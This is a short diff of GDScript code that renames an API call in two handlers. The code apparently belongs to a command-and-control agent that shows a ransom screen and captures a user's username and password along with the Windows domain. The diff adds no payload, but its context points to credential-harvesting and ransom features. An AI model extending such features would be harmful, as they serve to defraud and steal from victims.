@@ -46,7 +46,7 @@ func _on_tasking_ransom(task):
 		show()
 		task_id = task.get("id")
 		
-		api.agent_response(
+		api.send_agent_response(
 			api.create_task_response(
 				true,
 				false,
@@ -68,7 +68,7 @@ func _on_GUI_verify_username_password(username, password):
 	if OS.has_environment("USERDOMAIN"):
 		realm = OS.get_environment("USERDOMAIN")
 
-	api.agent_response(
+	api.send_agent_response(
 		api.create_task_response(
 			true,
 			true,
